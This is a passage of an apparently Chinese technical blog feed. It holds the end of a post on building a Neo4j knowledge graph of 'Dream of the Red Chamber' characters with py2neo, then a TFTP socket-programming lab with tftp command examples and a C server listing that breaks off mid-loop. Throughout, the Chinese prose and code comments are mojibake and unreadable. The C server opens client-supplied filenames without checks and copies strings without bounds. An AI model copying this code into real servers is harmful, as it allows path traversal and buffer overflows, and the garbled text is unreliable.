çŸ¥è¯†å›¾è°±æ„å»ºæ¡ˆä¾‹åˆ†æ"></a>2.4 çŸ¥è¯†å›¾è°±æ„å»ºæ¡ˆä¾‹åˆ†æ</h3><h4 id="2-4-1-çº¢æ¥¼æ¢¦äººç‰©å…³ç³»å›¾è°±æ„å»º"><a href="#2-4-1-çº¢æ¥¼æ¢¦äººç‰©å…³ç³»å›¾è°±æ„å»º" class="headerlink" title="2.4.1 çº¢æ¥¼æ¢¦äººç‰©å…³ç³»å›¾è°±æ„å»º"></a>2.4.1 çº¢æ¥¼æ¢¦äººç‰©å…³ç³»å›¾è°±æ„å»º</h4><ol><li>æ„å»ºæ–¹æ³•:é€šè¿‡å·²æœé›†å¥½çš„äººç‰©å…³ç³»è¡¨æ ¼æ„å»ºçŸ¥è¯†å›¾è°±ï¼Œè¡¨æ ¼æ ·å¼å¦‚ä¸‹:<br><img src="/img/AI_project/KnowledgeGraph/7.png" alt="image"><br>è¡¨æ ¼ä¸­å·²ç»éå¸¸æ˜ç¡®çš„ç»™å‡ºäº†å„èŠ‚ç‚¹ä¹‹é—´çš„å…³ç³»ã€‚</li><li>ä»£ç : <figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">import csv</span><br><span class="line">from py2neo import Graph,Node,Relationship,NodeMatcher</span><br><span class="line">#è´¦å·å¯†ç æ”¹ä¸ºè‡ªå·±çš„å³å¯</span><br><span class="line">g=Graph(&#x27;neo4j://localhost:7687&#x27;,user=&#x27;neo4j&#x27;,password=&#x27;&#x27;)</span><br><span class="line">g.run(&#x27;match (n) detach delete n&#x27;)</span><br><span class="line">with open(&#x27;hlm.txt&#x27;,&#x27;r&#x27;,encoding=&#x27;utf-8&#x27;) as f:</span><br><span class="line">    reader=csv.reader(f)</span><br><span class="line">    for item in reader:</span><br><span class="line">        if reader.line_num==1:</span><br><span class="line">            continue</span><br><span class="line">        print(&quot;å½“å‰è¡Œæ•°ï¼š&quot;,reader.line_num,&quot;å½“å‰å†…å®¹ï¼š&quot;,item)</span><br><span class="line">        start_node=Node(&quot;Person&quot;,name=item[0])</span><br><span class="line">        end_node=Node(&quot;Person&quot;,name=item[1])</span><br><span class="line">        relation=Relationship(start_node,item[3],end_node)</span><br><span class="line">        g.merge(start_node,&quot;Person&quot;,&quot;name&quot;)</span><br><span class="line">        g.merge(end_node,&quot;Person&quot;,&quot;name&quot;)</span><br><span class="line">        g.merge(relation,&quot;Person&quot;,&quot;name&quot;)</span><br><span class="line">print(&#x27;end&#x27;)</span><br></pre></td></tr></table></figure></li><li>ä¼˜åŠ£æ€§è¯´æ˜<br>è¿™ç§æ–¹æ³•æ¥å¾—æœ€ç›´æ¥ï¼Œä¸è¿‡éœ€è¦è´¹æ—¶é—´æœé›†æˆ–è€…è‡ªå·±æ•´ç†å‡ºç›¸å…³çš„å…³ç³»æ•°æ®ï¼Œæ•´ç†å‡ºè¿™æ ·ä¸€ä»½è¡¨æ ¼ã€‚</li></ol><h4 id="2-4-2-å€ŸåŠ©AIå¤§æ¨¡å‹è¿›è¡ŒçŸ¥è¯†å›¾è°±æ„å»º"><a href="#2-4-2-å€ŸåŠ©AIå¤§æ¨¡å‹è¿›è¡ŒçŸ¥è¯†å›¾è°±æ„å»º" class="headerlink" title="2.4.2 å€ŸåŠ©AIå¤§æ¨¡å‹è¿›è¡ŒçŸ¥è¯†å›¾è°±æ„å»º"></a>2.4.2 å€ŸåŠ©AIå¤§æ¨¡å‹è¿›è¡ŒçŸ¥è¯†å›¾è°±æ„å»º</h4><p>è¿™ç§æ–¹æ³•éå¸¸ç±»ä¼¼GraphRAGï¼Œç›´æ¥å°†æ–‡æœ¬è¾“ç»™gptï¼Œç„¶åæå‡ºç±»ä¼¼â€œè¯·æŠ½å–å…¶ä¸­çš„å®ä½“å’Œå®ä½“é—´çš„å…³ç³»ï¼Œå¹¶ç”Ÿæˆneo4jä»£ç â€çš„è¦æ±‚ï¼Œå‰©ä¸‹çš„å·¥ä½œä¾¿å¯äº¤ç»™gptå®Œæˆã€‚<br>GraphRAGåªä¸è¿‡æ˜¯è®©è¿™ä¸€è¿‡ç¨‹è‡ªåŠ¨åŒ–è¿›è¡Œï¼Œå…¶ä¸­çœŸæ­£æ¥å¤„ç†æ–‡æœ¬ï¼ŒæŠ½å–å®ä½“ç­‰å·¥ä½œè¿˜æ˜¯äº¤ç»™äº†å¤§æ¨¡å‹ã€‚  </p><h4 id="2-4-3-åŒ»ç–—çŸ¥è¯†å›¾è°±æ„å»º"><a href="#2-4-3-åŒ»ç–—çŸ¥è¯†å›¾è°±æ„å»º" class="headerlink" title="2.4.3 åŒ»ç–—çŸ¥è¯†å›¾è°±æ„å»º"></a>2.4.3 åŒ»ç–—çŸ¥è¯†å›¾è°±æ„å»º</h4><p><a href="https://github.com/liuhuanyong/QASystemOnMedicalKG">é¡¹ç›®æºåœ°å€</a><br>ä¸çº¢æ¥¼æ¢¦äººç‰©çŸ¥è¯†å›¾è°±æ„å»ºæ‰€éœ€çš„æ•°æ®æ ¼å¼ç±»ä¼¼ï¼Œéœ€è¦æ•´ç†å¥½çš„æ•°æ®<br>ä¸åŒçš„æ˜¯é¡¹ç›®è¿˜æä¾›äº†çˆ¬è™«æ¨¡å—ï¼Œæ”¯æŒä»æŒ‡å®šçš„ç½‘ç«™ä¸Šçˆ¬å–ä¿¡æ¯ï¼Œå¹¶å¯¹ä¿¡æ¯è¿›è¡Œæ•°æ®æ•´ç†ä»¥è¾¾åˆ°å¯ä»¥è¿›è¡Œå›¾è°±æ„å»ºçš„ç›®çš„ã€‚<br>é¡¹ç›®è¿˜æœ‰é—®ç­”åŠŸèƒ½ï¼Œä¸ç”¨apiæ¥å£å®ç°ã€‚</p>]]></content>
      
      
      <categories>
          
          <category> AI </category>
          
      </categories>
      
      
        <tags>
            
            <tag> GraphRAG </tag>
            
            <tag> Neo4j </tag>
            
            <tag> çŸ¥è¯†å›¾è°± </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>tftpå¥—æ¥å­—ç¼–ç¨‹</title>
      <link href="/2024/10/07/2024-10-7-network/"/>
      <url>/2024/10/07/2024-10-7-network/</url>
      
        <content type="html"><![CDATA[<h3 id="å®éªŒè¦æ±‚"><a href="#å®éªŒè¦æ±‚" class="headerlink" title="å®éªŒè¦æ±‚"></a>å®éªŒè¦æ±‚</h3><p><img src="/img/network/2-5.png"></p><h3 id="äº¤äº’å‘½ä»¤"><a href="#äº¤äº’å‘½ä»¤" class="headerlink" title="äº¤äº’å‘½ä»¤"></a>äº¤äº’å‘½ä»¤</h3><ol><li>ä»æœåŠ¡å™¨ä¸‹è½½æ–‡ä»¶<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">tftp -i &lt;æœåŠ¡å™¨IPåœ°å€&gt; GET &lt;è¿œç¨‹æ–‡ä»¶å&gt; &lt;æœ¬åœ°ä¿å­˜æ–‡ä»¶å&gt;</span><br><span class="line"><span class="function">ex:</span></span><br><span class="line"><span class="function"><span class="title">tftp</span> -<span class="title">i</span> 127.0.0.1 <span class="title">GET</span> <span class="title">test.txt</span> <span class="title">C</span>:/<span class="title">user</span>/30905/<span class="title">Desktop</span></span></span><br></pre></td></tr></table></figure></li><li>å‘æœåŠ¡å™¨ä¸Šä¼ æ–‡ä»¶<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">tftp -i &lt;æœåŠ¡å™¨IPåœ°å€&gt; PUT &lt;æœ¬åœ°æ–‡ä»¶å&gt; &lt;è¿œç¨‹ä¿å­˜æ–‡ä»¶å&gt;</span><br><span class="line"><span class="function">ex:</span></span><br><span class="line"><span class="function"><span class="title">tftp</span> -<span class="title">i</span> 127.0.0.1 <span class="title">PUT</span> <span class="title">test.txt</span> <span class="title">testfile.txt</span></span></span><br></pre></td></tr></table></figure></li><li>ä¸‹è½½æ–‡ä»¶çš„netasciiæ¨¡å¼<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tftp &lt;æœåŠ¡å™¨IPåœ°å€&gt; GET &lt;è¿œç¨‹æ–‡ä»¶å&gt; </span><br></pre></td></tr></table></figure></li><li>ä¸Šä¼ æ–‡ä»¶çš„netasciiæ¨¡å¼<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tftp &lt;æœåŠ¡å™¨IPåœ°å€&gt; PUT &lt;æœ¬åœ°æ–‡ä»¶å&gt; </span><br></pre></td></tr></table></figure></li></ol><h3 id="æ•ˆæœæ¼”ç¤º"><a href="#æ•ˆæœæ¼”ç¤º" class="headerlink" title="æ•ˆæœæ¼”ç¤º"></a>æ•ˆæœæ¼”ç¤º</h3><ul><li>æ­£å¸¸çŠ¶æ€ä¸‹<ul><li>æ–‡ä»¶ä¸‹è½½<br><img src="/img/network/2-1.png"></li><li>æ–‡ä»¶ä¸Šä¼ <br><img src="/img/network/2-2.png"></li></ul></li><li>å¼‚å¸¸çŠ¶æ€ä¸‹<br><img src="/img/network/2-3.png"><br><img src="/img/network/2-4.png"></li></ul><hr><p><strong>TFTPæºç </strong><br><strong>æ³¨ï¼šä»æœ‰å¾ˆå¤šå¯ä»¥å®Œå–„çš„åœ°æ–¹ï¼Œä»…ä¾›å‚è€ƒ</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># <span class="keyword">if</span> 1</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _CRT_SECURE_NO_WARNINGS</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;winsock2.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;time.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment(lib, <span class="string">&quot;ws2_32.lib&quot;</span>) <span class="comment">// Winsock Libraryï¼Œç¡®ä¿é“¾æ¥Winsockåº“</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PORT 69             <span class="comment">// TFTPåè®®é»˜è®¤çš„ç«¯å£å·ä¸º69</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BUFFER_SIZE 516     <span class="comment">// TFTPçš„æœ€å¤§åŒ…å¤§å°ä¸º516å­—èŠ‚ï¼ˆ4å­—èŠ‚å¤´éƒ¨+512å­—èŠ‚æ•°æ®ï¼‰</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DATA_SIZE 512       <span class="comment">// TFTPæ•°æ®å—æœ€å¤§ä¸º512å­—èŠ‚</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> TIMEOUT_SECONDS 5             <span class="comment">// è¶…æ—¶é‡ä¼ çš„æœ€å¤§æ—¶å»¶</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BACK_NUM 10          <span class="comment">//é‡ä¼ æœ€å¤§æ¬¡æ•°</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// TFTPæ“ä½œç å®šä¹‰ï¼ˆæ ¹æ®TFTPåè®®ï¼‰</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> OP_RRQ 1            <span class="comment">// è¯»è¯·æ±‚ï¼ˆRead Requestï¼‰</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> OP_WRQ 2            <span class="comment">// å†™è¯·æ±‚ï¼ˆWrite Requestï¼‰</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> OP_DATA 3           <span class="comment">// æ•°æ®åŒ…ï¼ˆData Packetï¼‰</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> OP_ACK 4            <span class="comment">// ç¡®è®¤åŒ…ï¼ˆAcknowledgement Packetï¼‰</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> OP_ERROR 5          <span class="comment">// é”™è¯¯åŒ…ï¼ˆError Packetï¼‰</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// TFTPé”™è¯¯ç å®šä¹‰ï¼ˆæ ¹æ®TFTPåè®®ï¼‰</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ERR_FILE_NOT_FOUND 1</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ERR_ACCESS_VIOLATION 2</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ERR_DISK_FULL 3</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ERR_ILLEGAL_OP 4</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ERR_UNKNOWN_TRANSFER_ID 5</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// å®šä¹‰TFTPä¼ è¾“æ¨¡å¼</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MODE_NETASCII <span class="string">&quot;netascii&quot;</span>   <span class="comment">// æ–‡æœ¬æ¨¡å¼</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MODE_OCTET <span class="string">&quot;octet&quot;</span>         <span class="comment">// äºŒè¿›åˆ¶æ¨¡å¼</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// æ—¥å¿—è®°å½•å‡½æ•°ï¼šè®°å½•ç³»ç»Ÿè¡Œä¸ºæ—¥å¿—åˆ° &quot;tftp_server.log&quot;</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">log_message</span><span class="params">(<span class="type">const</span> <span class="type">char</span>* message)</span> &#123;</span><br><span class="line">    FILE* log_file = fopen(<span class="string">&quot;tftp_server.log&quot;</span>, <span class="string">&quot;a&quot;</span>);  <span class="comment">// ä»¥è¿½åŠ æ¨¡å¼æ‰“å¼€æ—¥å¿—æ–‡ä»¶</span></span><br><span class="line">    <span class="keyword">if</span> (log_file != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="type">time_t</span> now = time(<span class="literal">NULL</span>);  <span class="comment">// è·å–å½“å‰æ—¶é—´</span></span><br><span class="line">        <span class="built_in">fprintf</span>(log_file, <span class="string">&quot;%s: %s\n&quot;</span>, ctime(&amp;now), message);  <span class="comment">// å°†æ—¶é—´å’Œæ—¥å¿—ä¿¡æ¯å†™å…¥æ–‡ä»¶</span></span><br><span class="line">        fclose(log_file);  <span class="comment">// å…³é—­æ—¥å¿—æ–‡ä»¶</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// å‘é€é”™è¯¯åŒ…ï¼šæ ¹æ®TFTPåè®®æ„é€ å¹¶å‘é€é”™è¯¯å“åº”åŒ…</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">send_error</span><span class="params">(SOCKET sock, <span class="keyword">struct</span> sockaddr_in* client_addr, <span class="type">int</span> addr_len, <span class="type">int</span> error_code, <span class="type">const</span> <span class="type">char</span>* error_msg)</span> &#123;</span><br><span class="line">    <span class="type">char</span> error_packet[BUFFER_SIZE];</span><br><span class="line">    *(<span class="type">unsigned</span> <span class="type">short</span>*)error_packet = htons(OP_ERROR);               <span class="comment">// æ“ä½œç ï¼ˆ2å­—èŠ‚ï¼‰</span></span><br><span class="line">    *(<span class="type">unsigned</span> <span class="type">short</span>*)(error_packet + <span class="number">2</span>) = htons(error_code);       <span class="comment">// é”™è¯¯ç ï¼ˆ2å­—èŠ‚ï¼‰</span></span><br><span class="line">    <span class="built_in">strcpy</span>(error_packet + <span class="number">4</span>, error_msg);                            <span class="comment">// é”™è¯¯æ¶ˆæ¯</span></span><br><span class="line">    sendto(sock, error_packet, <span class="built_in">strlen</span>(error_msg) + <span class="number">5</span>, <span class="number">0</span>, (<span class="keyword">struct</span> sockaddr*)client_addr, addr_len); <span class="comment">// å‘é€é”™è¯¯åŒ…</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// å¤„ç†å®¢æˆ·ç«¯çš„è¯·æ±‚ï¼ŒåŒ…æ‹¬è¯»è¯·æ±‚å’Œå†™è¯·æ±‚</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">handle_client</span><span class="params">(SOCKET sock, <span class="keyword">struct</span> sockaddr_in* client_addr, <span class="type">int</span> addr_len)</span> &#123;</span><br><span class="line">    <span class="comment">// å¤„ç†å®¢æˆ·ç«¯çš„è¯·æ±‚ï¼ŒåŒ…æ‹¬è¯»è¯·æ±‚å’Œå†™è¯·æ±‚</span></span><br><span class="line">    <span class="type">char</span> buffer[BUFFER_SIZE];  <span class="comment">// ç”¨äºæ¥æ”¶å’Œå‘é€æ•°æ®çš„ç¼“å†²åŒº</span></span><br><span class="line">    <span class="type">int</span> recv_len, bytes_transferred = <span class="number">0</span>;  <span class="comment">// æ¥æ”¶åˆ°çš„æ•°æ®é•¿åº¦ï¼Œå·²ä¼ è¾“å­—èŠ‚æ•°</span></span><br><span class="line">    <span class="type">char</span>* filename, * mode;  <span class="comment">// æ–‡ä»¶åå’Œä¼ è¾“æ¨¡å¼</span></span><br><span class="line">    <span class="type">char</span> log_buf[<span class="number">512</span>];  <span class="comment">// æ—¥å¿—ç¼“å†²åŒº</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// ä»å®¢æˆ·ç«¯æ¥æ”¶æ•°æ®</span></span><br><span class="line">    recv_len = recvfrom(sock, buffer, BUFFER_SIZE, <span class="number">0</span>, (<span class="keyword">struct</span> sockaddr*)client_addr, &amp;addr_len);</span><br><span class="line">    <span class="keyword">if</span> (recv_len &lt; <span class="number">4</span>) &#123;</span><br><span class="line">        <span class="comment">// å¦‚æœæ•°æ®é•¿åº¦å°äº4å­—èŠ‚ï¼Œè¡¨ç¤ºè¯·æ±‚æ— æ•ˆï¼Œå‘é€é”™è¯¯åŒ…</span></span><br><span class="line">        send_error(sock, client_addr, addr_len, ERR_ILLEGAL_OP, <span class="string">&quot;Illegal TFTP operation.&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// æå–æ“ä½œç å’Œæ–‡ä»¶åã€ä¼ è¾“æ¨¡å¼</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">short</span> opcode = ntohs(*(<span class="type">unsigned</span> <span class="type">short</span>*)buffer);  <span class="comment">// æ“ä½œç ï¼ˆå‰ä¸¤ä¸ªå­—èŠ‚ï¼‰</span></span><br><span class="line">    filename = buffer + <span class="number">2</span>;  <span class="comment">// æ–‡ä»¶åç´§è·Ÿåœ¨æ“ä½œç ä¹‹å</span></span><br><span class="line">    mode = filename + <span class="built_in">strlen</span>(filename) + <span class="number">1</span>;  <span class="comment">// æ¨¡å¼ç´§è·Ÿåœ¨æ–‡ä»¶åä¹‹å</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// æ£€æŸ¥ä¼ è¾“æ¨¡å¼æ˜¯å¦ä¸ºæ”¯æŒçš„æ¨¡å¼ï¼ˆnetasciiæˆ–octetï¼‰</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">strcmp</span>(mode, MODE_NETASCII) != <span class="number">0</span> &amp;&amp; <span class="built_in">strcmp</span>(mode, MODE_OCTET) != <span class="number">0</span>) &#123;</span><br><span class="line">        send_error(sock, client_addr, addr_len, ERR_ILLEGAL_OP, <span class="string">&quot;Unsupported transfer mode.&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// æ ¹æ®æ“ä½œç è¿›è¡Œä¸åŒçš„å¤„ç†</span></span><br><span class="line">    <span class="keyword">if</span> (opcode == OP_RRQ) &#123;</span><br><span class="line">        <span class="comment">// å¤„ç†è¯»è¯·æ±‚ï¼ˆä»æœåŠ¡å™¨ä¸‹è½½æ–‡ä»¶ï¼‰</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Handling RRQ: Download %s in %s mode\n&quot;</span>, filename, mode);</span><br><span class="line">        <span class="built_in">sprintf</span>(log_buf, <span class="string">&quot;Received RRQ for file: %s&quot;</span>, filename);  <span class="comment">// è®°å½•è¯·æ±‚æ—¥å¿—</span></span><br><span class="line">        log_message(log_buf);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// æ‰“å¼€è¦è¯»å–çš„æ–‡ä»¶</span></span><br><span class="line">        FILE* file = fopen(filename, mode[<span class="number">0</span>] == <span class="string">&#x27;o&#x27;</span> ? <span class="string">&quot;rb&quot;</span> : <span class="string">&quot;r&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (!file) &#123;</span><br><span class="line">            <span class="comment">// å¦‚æœæ–‡ä»¶ä¸å­˜åœ¨ï¼Œå‘é€æ–‡ä»¶æœªæ‰¾åˆ°çš„é”™è¯¯åŒ…</span></span><br><span class="line">            send_error(sock, client_addr, addr_len, ERR_FILE_NOT_FOUND, <span class="string">&quot;File not found.&quot;</span>);</span><br><span class="line">            log_message(<span class="string">&quot;Error: File not found.&quot;</span>);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;Error: File not found.&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">char</span> data_packet[BUFFER_SIZE];  <span class="comment">// æ•°æ®åŒ…ç¼“å†²åŒº</span></span><br><span class="line">        <span class="type">unsigned</span> <span class="type">short</span> block_number = <span class="number">1</span>;  <span class="comment">// åˆå§‹åŒ–æ•°æ®å—ç¼–å·</span></span><br><span class="line">        <span class="type">int</span> bytes_read;</span><br><span class="line">        <span class="type">clock_t</span> start_time = clock();  <span class="comment">// å¼€å§‹è®¡æ—¶</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// å¾ªç¯é€å—å‘é€æ–‡ä»¶å†…å®¹</span></span><br><span class="line">        <span class="keyword">do</span> &#123;</span><br><span class="line">            <span class="built_in">memset</span>(data_packet, <span class="number">0</span>, BUFFER_SIZE);  <span class="comment">// æ¸…ç©ºæ•°æ®åŒ…ç¼“å†²åŒº</span></span><br><span class="line">            *(<span class="type">unsigned</span> <span class="type">short</span>*)data_packet = htons(OP_DATA);  <span class="comment">// æ“ä½œç ï¼šæ•°æ®åŒ…</span></span><br><span class="line">            *(<span class="type">unsigned</span> <span class="type">short</span>*)(data_packet + <span class="number">2</span>) = htons(block_number);  <span class="comment">// æ•°æ®å—ç¼–å·</span></span><br><span class="line"></span><br><span class="line">            bytes_read = fread(data_packet + <span class="number">4</span>, <span class="number">1</span>, DATA_SIZE, file);  <span class="comment">// è¯»å–æ–‡ä»¶æ•°æ®</span></span><br><span class="line">            <span class="type">int</span> ack_received = <span class="number">0</span>;  <span class="comment">// æ ‡è®°ACKæ˜¯å¦å·²æ¥æ”¶</span></span><br><span class="line">            <span class="type">int</span> retries = <span class="number">0</span>;  <span class="comment">// é‡ä¼ æ¬¡æ•°</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">while</span> (!ack_received 